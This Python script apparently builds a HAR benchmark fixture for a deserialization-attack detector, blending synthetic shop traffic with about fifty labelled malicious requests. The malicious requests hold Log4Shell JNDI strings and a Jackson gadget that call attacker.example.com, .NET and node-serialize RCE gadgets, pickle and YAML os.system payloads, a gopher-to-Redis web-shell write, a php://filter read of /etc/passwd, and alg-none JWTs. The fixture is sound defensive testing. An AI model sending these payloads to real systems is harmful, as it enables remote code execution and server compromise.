import json
import base64
import gzip
import random
import sys
import urllib.parse

random.seed(1337)

BASE = "https://shop.example.com"
STATIC_HOST = "https://cdn.example.com"

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
]
LANGS = ["en-US,en;q=0.9", "vi-VN,vi;q=0.9,en;q=0.8", "fr-FR,fr;q=0.9", "ja-JP,ja;q=0.9", "de-DE,de;q=0.8"]
CATEGORIES = ["electronics", "books", "clothing", "toys", "sports", "home-garden", "beauty", "automotive"]
BRANDS = ["acme", "globex", "initech", "umbrella", "stark-industries", "wayne-ent"]
SORT_OPTS = ["relevance", "price_asc", "price_desc", "newest", "rating"]
REFERERS = [f"{BASE}/", f"{BASE}/category/electronics", "https://www.google.com/", "https://www.facebook.com/", ""]
STATIC_EXTS = ["jpg", "png", "css", "js", "svg", "gif", "mp4"]


def baseline_cookies():
    return {
        "_ga": f"GA1.2.{random.randint(10**9, 10**10)}.{1700000000 + random.randint(0, 999999)}",
        "cart_id": f"c{random.randint(0, 99999999):08d}",
        "locale": random.choice(["en", "vi", "fr"]),
    }


def _parse_cookie_header(raw: str) -> dict:
    parsed = {}
    for part in raw.split("; "):
        if "=" in part:
            k, _, v = part.partition("=")
            parsed[k.strip()] = v.strip()
    return parsed


def entry(url, method="GET", cookies=None, headers=None, query=None,
          post_params=None, post_text=None, post_mime=None, status=200):
    hdrs = dict(common_browser_headers(random.randint(0, 10**6)))
    hdrs.update(headers or {})

    explicit_cookie_header = next((v for k, v in hdrs.items() if k.lower() == "cookie"), None)
    if explicit_cookie_header is not None:
        cookie_map = _parse_cookie_header(explicit_cookie_header)
    else:
        cookie_map = dict(baseline_cookies())
        cookie_map.update(cookies or {})
        hdrs["Cookie"] = "; ".join(f"{k}={v}" for k, v in cookie_map.items())

    req = {
        "method": method, "url": url, "httpVersion": "HTTP/1.1",
        "cookies": [{"name": k, "value": v} for k, v in cookie_map.items()],
        "headers": [{"name": k, "value": v} for k, v in hdrs.items()],
        "queryString": [{"name": k, "value": v} for k, v in (query or {}).items()],
        "headersSize": -1, "bodySize": -1,
    }
    if post_params is not None or post_text is not None:
        post_data = {"mimeType": post_mime or "application/x-www-form-urlencoded"}
        if post_params is not None:
            post_data["params"] = [{"name": k, "value": v} for k, v in post_params.items()]
        if post_text is not None:
            post_data["text"] = post_text
        req["postData"] = post_data

    resp_mime = "application/json" if "application/json" in hdrs.get("Accept", "") else "text/html"
    resp_headers = {
        "Content-Type": f"{resp_mime}; charset=utf-8",
        "Server": "nginx/1.24.0",
        "Cache-Control": "no-store" if status != 200 else random.choice(["no-cache", "private, max-age=60"]),
    }
    if method == "POST" or "/api/" in url:
        resp_headers["X-Powered-By"] = "Express"
    resp_cookies = []
    if random.random() < 0.2:
        resp_cookies.append({"name": "csrf_token", "value": f"tok{random.randint(0, 10**8):08d}"})

    resp_text = '{"ok":true}' if resp_mime == "application/json" else "<html><body>OK</body></html>"

    cache = {}
    if random.random() < 0.35:
        cache = {
            "afterRequest": {
                "lastAccess": "2026-09-12T00:00:00.000Z",
                "eTag": f'"{random.randint(100000, 999999)}"',
                "hitCount": random.randint(0, 5),
            }
        }

    return {
        "startedDateTime": "2026-09-12T00:00:00.000Z",
        "time": random.randint(5, 300),
        "request": req,
        "response": {
            "status": status, "statusText": "OK" if status == 200 else "Error",
            "httpVersion": "HTTP/1.1",
            "cookies": resp_cookies,
            "headers": [{"name": k, "value": v} for k, v in resp_headers.items()],
            "content": {"size": random.randint(100, 50000), "mimeType": resp_mime, "text": resp_text},
            "redirectURL": "", "headersSize": -1, "bodySize": -1,
        },
        "cache": cache, "timings": {"send": 0, "wait": random.randint(5, 300), "receive": 0},
    }


def gz_b64(raw: bytes) -> str:
    return base64.b64encode(gzip.compress(raw)).decode()


def b64(raw: bytes) -> str:
    return base64.b64encode(raw).decode()


def realistic_jwt(seed: int) -> str:
    header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').decode().rstrip("=")
    payload = base64.urlsafe_b64encode(
        json.dumps({"sub": f"user{seed}", "iat": 1700000000 + seed, "exp": 1700003600 + seed}).encode()
    ).decode().rstrip("=")
    sig = base64.urlsafe_b64encode(bytes([(seed * 31 + i) % 256 for i in range(32)])).decode().rstrip("=")
    return f"{header}.{payload}.{sig}"


def jwt_with_claim(seed: int, extra_claims: dict, alg_none: bool = False) -> str:
    """JWT giong that, nhung nhet them 1 claim chua gadget deserialize —
    dung de test Normalize co tach va decode tung doan JWT roi phat hien
    duoc gadget nam trong claim hay khong (thay vi bo sot ca token)."""
    header_obj = {"alg": "none", "typ": "JWT"} if alg_none else {"alg": "HS256", "typ": "JWT"}
    header = base64.urlsafe_b64encode(json.dumps(header_obj).encode()).decode().rstrip("=")
    payload_obj = {"sub": f"user{seed}", "iat": 1700000000 + seed, "exp": 1700003600 + seed}
    payload_obj.update(extra_claims)
    payload = base64.urlsafe_b64encode(json.dumps(payload_obj).encode()).decode().rstrip("=")
    if alg_none:
        return f"{header}.{payload}."
    sig = base64.urlsafe_b64encode(bytes([(seed * 31 + i) % 256 for i in range(32)])).decode().rstrip("=")
    return f"{header}.{payload}.{sig}"


def common_browser_headers(i):
    return {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": random.choice(LANGS),
        "Accept-Encoding": "gzip, deflate, br",
        "User-Agent": random.choice(UAS),
        "Referer": random.choice(REFERERS),
        "Cache-Control": "no-cache" if i % 3 == 0 else "max-age=0",
        "Connection": "keep-alive",
        "sec-ch-ua": '"Chromium";v="128", "Not;A=Brand";v="24"',
        "sec-ch-ua-mobile": "?0",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
    }



noise_entries = []

N_STATIC = 120
for i in range(N_STATIC):
    ext = random.choice(STATIC_EXTS)
    noise_entries.append(entry(
        f"{STATIC_HOST}/assets/img/product-{i}.{ext}",
        headers={"Accept": "image/*", "User-Agent": random.choice(UAS), "Cache-Control": "max-age=31536000"},
    ))

N_BROWSE = 150
for i in range(N_BROWSE):
    noise_entries.append(entry(
        f"{BASE}/category/{random.choice(CATEGORIES)}",
        query={
            "page": str(i % 30 + 1),
            "sort": random.choice(SORT_OPTS),
            "brand": random.choice(BRANDS),
            "price_min": str(random.randint(0, 50) * 10),
            "price_max": str(random.randint(50, 200) * 10),
        },
        headers=common_browser_headers(i),
        cookies={"_ga": f"GA1.2.{random.randint(10**9,10**10)}.{1700000000+i}",
                 "cart_id": f"c{i:08d}", "locale": random.choice(["en", "vi", "fr"])},
    ))

N_SEARCH = 60
for i in range(N_SEARCH):
    noise_entries.append(entry(
        f"{BASE}/search",
        query={"q": f"product name {i}", "utm_source": "newsletter", "utm_medium": "email",
               "utm_campaign": f"promo{i % 12}", "fbclid": f"IwAR{i}xyz"},
        headers=common_browser_headers(i),
    ))

N_PRODUCT = 80
for i in range(N_PRODUCT):
    noise_entries.append(entry(
        f"{BASE}/api/products/{1000+i}",
        headers={**common_browser_headers(i), "Accept": "application/json"},
        cookies={"_ga": f"GA1.2.{random.randint(10**9,10**10)}.{1700000000+i}"},
    ))

N_TRACK = 70
for i in range(N_TRACK):
    noise_entries.append(entry(
        f"{BASE}/api/analytics/event", method="POST",
        post_text=json.dumps({"event": random.choice(["page_view", "add_to_cart", "click"]),
                               "session_id": f"s{i:08d}", "ts": 1700000000 + i, "page": f"/product/{i}"}),
        post_mime="application/json",
        headers={"Content-Type": "application/json", "User-Agent": random.choice(UAS)},
    ))

N_CART = 40
for i in range(N_CART):
    noise_entries.append(entry(
        f"{BASE}/api/cart/add", method="POST",
        post_params={"product_id": str(2000 + i), "qty": str(i % 5 + 1), "variant": random.choice(["S", "M", "L"])},
        cookies={"cart_id": f"c{i:08d}"},
    ))

N_AUTH_BENIGN = 25
for i in range(N_AUTH_BENIGN):
    noise_entries.append(entry(
        f"{BASE}/api/account/profile",
        headers={"Authorization": f"Bearer {realistic_jwt(i)}", "Accept": "application/json"},
    ))

N_XHR_MISC = 30
for i in range(N_XHR_MISC):
    noise_entries.append(entry(
        f"{BASE}/api/notifications",
        query={"since": str(1700000000 + i), "limit": "20"},
        headers={"X-Requested-With": "XMLHttpRequest", "Accept": "application/json"},
    ))

N_WS = 10
for i in range(N_WS):
    noise_entries.append(entry(
        f"{BASE}/ws/live-updates",
        headers={
            "Upgrade": "websocket", "Connection": "Upgrade",
            "Sec-WebSocket-Key": base64.b64encode(bytes(range(16))).decode(),
            "Sec-WebSocket-Version": "13",
        },
    ))

N_SPOOF = 15
for i in range(N_SPOOF):
    noise_entries.append(entry(
        f"{BASE}/api/whoami",
        headers={"X-Forwarded-For": f"10.0.{i % 255}.{(i * 7) % 255}", "X-Real-IP": f"192.168.{i % 255}.1"},
    ))

N_ERR = 20
for i in range(N_ERR):
    noise_entries.append(entry(f"{BASE}/api/products/{99000 + i}", status=random.choice([404, 500, 302]),
                                headers=common_browser_headers(i)))

print(f"Noise entries generated: {len(noise_entries)}", file=sys.stderr)


php_priv_esc = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}'
java_raw_short = b'\xac\xed\x00\x05sr\x00\x0bTestClass\x00'
java_raw_long = b'\xac\xed\x00\x05sr\x00\x11java.util.HashMap padding text to make this a realistically long serialized java object payload 1234567890'
ruby_raw_short = b'\x04\x08o:\x09Foo\x00'
ruby_raw_long = b'\x04\x08' + b'o:\x09Object\x00' + b'extra padding to make it a realistically long ruby marshal payload 1234567890'
dotnet_viewstate = "/wEPDwUJODk5MDMyNjU5D2QWAgIDD2QWAgIBD2QWAgIBDw8WAh4EVGV4dAUDMS4wZGQY"
nodejs_proto = b'{"__proto__":{"isAdmin":true},"padding":"1234567890123456789"}'
yaml_payload = b"!!python/object/apply:os.system ['id']"
pickle_payload = b"c__builtin__\neval\np0\n(S'1+1'\np1\ntp2\nRp3\n."


java_cc6_names = (
    b'\xac\xed\x00\x05sr\x00\x32sun.reflect.annotation.AnnotationInvocationHandler'
    b'\x00org.apache.commons.collections.functors.InvokerTransformer'
    b'\x00org.apache.commons.collections.functors.ChainedTransformer'
    b'\x00org.apache.commons.collections.functors.ConstantTransformer'
    b'\x00java.util.PriorityQueue'
)

log4shell_jndi = "${jndi:ldap://attacker.example.com/Exploit}"
log4shell_jndi_waf_bypass = "${${lower:j}ndi:ldap://attacker.example.com/a}"

jackson_atclass_gadget = json.dumps({
    "@class": "org.springframework.context.support.ClassPathXmlApplicationContext",
    "value": "http://attacker.example.com/exploit-context.xml",
})

dotnet_jsonnet_gadget = json.dumps({
    "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, "
             "Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName": "Start",
    "MethodParameters": {
        "$type": "System.Collections.ArrayList, mscorlib, Version=4.0.0.0, "
                 "Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values": ["cmd", "/c calc"],
    },
    "ObjectInstance": {
        "$type": "System.Diagnostics.Process, System, Version=4.0.0.0, "
                 "Culture=neutral, PublicKeyToken=b77a5c561934e089",
    },
})

dotnet_soap_envelope = (
    '<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" '
    'xmlns:clr="http://schemas.microsoft.com/soap/encoding/clr/1.0" '
    'xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">'
    '<SOAP-ENV:Body><a1:BinaryFormatter xmlns:a1="http://schemas.microsoft.com/clr/nsassem/System/mscorlib">'
    '</a1:BinaryFormatter></SOAP-ENV:Body></SOAP-ENV:Envelope>'
)

php_expect_wrapper = "expect://id"

php_filter_chain_lfi = "php://filter/convert.base64-encode/resource=/etc/passwd"

redis_gopher_webshell = (
    "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0d%0a"
    "CONFIG%20SET%20dbfilename%20shell.php%0d%0a"
    "SET%20x%20%22%3C%3Fphp%20system(%24_GET%5B%27cmd%27%5D)%3B%3F%3E%22%0d%0a"
    "SAVE%0d%0a"
)

nodejs_cve_2017_5941 = json.dumps({
    "rce": "_$$ND_FUNC$$_function (){require('child_process').exec('id', "
           "function(error, stdout, stderr) { console.log(stdout) });}()"
})

pickle_textbook_os_system = b"cos\nsystem\n(S'id'\ntR."

php_monolog_rce1 = (
    'O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{'
    's:9:"\x00*\x00socket";'
    'O:29:"Monolog\\Handler\\BufferHandler":7:{'
    's:10:"\x00*\x00handler";r:2;'
    's:13:"\x00*\x00bufferSize";i:-1;'
    's:9:"\x00*\x00buffer";a:1:{i:0;a:2:{i:0;s:10:"phpinfo();";s:5:"level";N;}}'
    's:8:"\x00*\x00level";N;'
    's:14:"\x00*\x00initialized";b:1;'
    's:14:"\x00*\x00bufferLimit";i:-1;'
    's:13:"\x00*\x00processors";a:2:{i:0;s:7:"current";i:1;s:6:"assert";}'
    '}}'
)

php_level_integer = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"level";i:1;}'
php_role_string = 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:4:"role";s:4:"user";}'
php_identity_only = 'O:7:"Account":1:{s:5:"email";s:17:"victim@corp-x.com";}'
php_sensitive_only = 'O:7:"Payment":1:{s:6:"secret";s:16:"sk_live_51H8xJ2K";}'

malicious_entries = [
    entry(f"{BASE}/my-account", cookies={"session": b64(php_priv_esc.encode())}),
    entry(f"{BASE}/my-account", headers={
        "Cookie": f"session={b64(php_priv_esc.encode())}; _ga=GA1.2.123.456; cart_id=c00000001"
    }),
    entry(f"{BASE}/my-account", headers={
        "Cookie": f"_ga=GA1.2.123.456; session={b64(php_priv_esc.encode())}; cart_id=c00000001"
    }),
    entry(f"{BASE}/my-account", headers={
        "Cookie": f"_ga=GA1.2.123.456; cart_id=c00000001; session={b64(php_priv_esc.encode())}"
    }),

    entry(f"{BASE}/api/session", headers={"X-Session-Token": b64(java_raw_long)}),
    entry(f"{BASE}/api/session-gzip", headers={"X-Session-Token": gz_b64(java_raw_long)}),
    entry(f"{BASE}/api/session-short", headers={"X-Session-Token": b64(java_raw_short)}),
    entry(f"{BASE}/invoker/JMSInvokerServlet", method="POST",
          headers={"Content-Type": "application/x-java-serialized-object"},
          post_text=b64(java_raw_long), post_mime="application/x-java-serialized-object"),

    entry(f"{BASE}/Default.aspx", method="POST", post_params={
        "__VIEWSTATE": dotnet_viewstate,
        "__EVENTVALIDATION": "/wEWAwLXsY-DDA==",
    }),
    entry(f"{BASE}/api/state", headers={"X-View-State": gz_b64(dotnet_viewstate.encode())}),

    entry(f"{BASE}/api/update-profile", method="POST",
          post_text=json.dumps({"__proto__": {"isAdmin": True}}), post_mime="application/json"),
    entry(f"{BASE}/api/update-profile-hdr", headers={"X-Profile-Patch": gz_b64(nodejs_proto)}),

    entry(f"{BASE}/dashboard", cookies={"rails_session": b64(ruby_raw_long)}),
    entry(f"{BASE}/dashboard-gzip", cookies={"rails_session": gz_b64(ruby_raw_long)}),
    entry(f"{BASE}/dashboard-short", cookies={"rails_session": b64(ruby_raw_short)}),

    entry(f"{BASE}/download", query={"file": "phar://uploads/avatar.jpg/test.txt"}),
    entry(f"{BASE}/download-gzip", query={"file": gz_b64(b'phar://uploads/avatar.jpg/test.txt padding here 12345')}),
    entry(f"{BASE}/proxy-fetch", query={"target": "gopher://internal-redis:6379/_INFO"}),

    entry(f"{BASE}/api/task", query={"data": b64(pickle_payload)}),

    entry(f"{BASE}/api/config", method="POST", post_text=yaml_payload.decode(), post_mime="application/x-yaml"),
    entry(f"{BASE}/api/config-hdr", headers={"X-Config-Payload": gz_b64(yaml_payload)}),

    entry(f"{BASE}/api/upload-avatar", method="POST",
          headers={"Content-Disposition": f'form-data; name="avatar"; filename="{b64(php_priv_esc.encode())}.jpg"'},
          post_text="binary file placeholder", post_mime="multipart/form-data"),

    entry(f"{BASE}/api/account/profile", headers={
        "Authorization": f"Bearer {jwt_with_claim(900, {'sub': php_priv_esc})}",
        "Accept": "application/json",
    }),
    entry(f"{BASE}/api/account/settings", headers={
        "Authorization": f"Bearer {jwt_with_claim(901, {'config': yaml_payload.decode()})}",
        "Accept": "application/json",
    }),
    entry(f"{BASE}/api/account/profile-legacy", headers={
        "Authorization": f"Bearer {jwt_with_claim(902, {'sub': php_priv_esc}, alg_none=True)}",
        "Accept": "application/json",
    }),

    entry(f"{BASE}/api/session-cc6", headers={"X-Session-Token": b64(java_cc6_names)}),
    entry(f"{BASE}/api/session-cc6-gzip", headers={"X-Session-Token": gz_b64(java_cc6_names)}),

    entry(f"{BASE}/", headers={"User-Agent": log4shell_jndi}),
    entry(f"{BASE}/api/products/1", headers={"Referer": log4shell_jndi}),
    entry(f"{BASE}/api/products/2", headers={"X-Forwarded-For": log4shell_jndi_waf_bypass}),

    entry(f"{BASE}/api/import-config", method="POST",
          post_text=jackson_atclass_gadget, post_mime="application/json"),

    entry(f"{BASE}/api/state-json", method="POST",
          post_text=dotnet_jsonnet_gadget, post_mime="application/json"),

    entry(f"{BASE}/RemotingService.rem", method="POST",
          post_text=dotnet_soap_envelope, post_mime="text/xml"),

    entry(f"{BASE}/download-doc", query={"file": php_expect_wrapper}),

    entry(f"{BASE}/view-template", query={"template": php_filter_chain_lfi}),

    entry(f"{BASE}/proxy-fetch", query={"target": redis_gopher_webshell}),

    entry(f"{BASE}/api/update-profile-cve", method="POST",
          post_text=nodejs_cve_2017_5941, post_mime="application/json"),

    entry(f"{BASE}/api/task-v2", query={"data": b64(pickle_textbook_os_system)}),
    entry(f"{BASE}/api/task-v2-gzip", query={"data": gz_b64(pickle_textbook_os_system)}),

    entry(f"{BASE}/my-account-v2", cookies={"session": b64(php_monolog_rce1.encode('latin-1'))}),

    entry(f"{BASE}/my-account-level", cookies={"session": b64(php_level_integer.encode())}),
    entry(f"{BASE}/my-account-role", cookies={"session": b64(php_role_string.encode())}),
    entry(f"{BASE}/my-account-email", cookies={"session": b64(php_identity_only.encode())}),
    entry(f"{BASE}/api/billing", headers={"X-Billing-Token": b64(php_sensitive_only.encode())}),

    entry(f"{BASE}/api/account/multi-tenant", headers={
        "Authorization": f"Bearer {jwt_with_claim(910, {'php_ctx': php_priv_esc, 'ruby_ctx': b64(ruby_raw_long)})}",
        "Accept": "application/json",
    }),

    entry(f"{BASE}/api/account/dual-role", headers={
        "Authorization": f"Bearer {jwt_with_claim(911, {'primary': php_priv_esc, 'secondary': php_role_string})}",
        "Accept": "application/json",
    }),

    entry(f"{BASE}/api/account/nested-claim", headers={
        "Authorization": f"Bearer {jwt_with_claim(912, {'profile': {'sessions': [{'legacy': php_priv_esc}, 'noise-value']}})}",
        "Accept": "application/json",
    }),

    entry(f"{BASE}/api/legacy-session", cookies={"session": b64(b64(php_priv_esc.encode()).encode())}),

    entry(f"{BASE}/api/deep-session", query={
        "token": urllib.parse.quote(gz_b64(b64(php_priv_esc.encode()).encode()), safe=""),
    }),
]

random.shuffle(malicious_entries)

all_entries = noise_entries + malicious_entries
random.shuffle(all_entries)

har = {
    "log": {
        "version": "1.2",
        "creator": {"name": "EthicalQuoc comprehensive benchmark fixture", "version": "1.0"},
        "entries": all_entries,
    }
}

with open("TestCase/comprehensive.har", "w", encoding="utf-8") as f:
    json.dump(har, f, indent=2, ensure_ascii=False)

print(f"Wrote TestCase/comprehensive.har: {len(noise_entries)} noise + {len(malicious_entries)} malicious "
      f"= {len(all_entries)} total HTTP entries", file=sys.stderr)
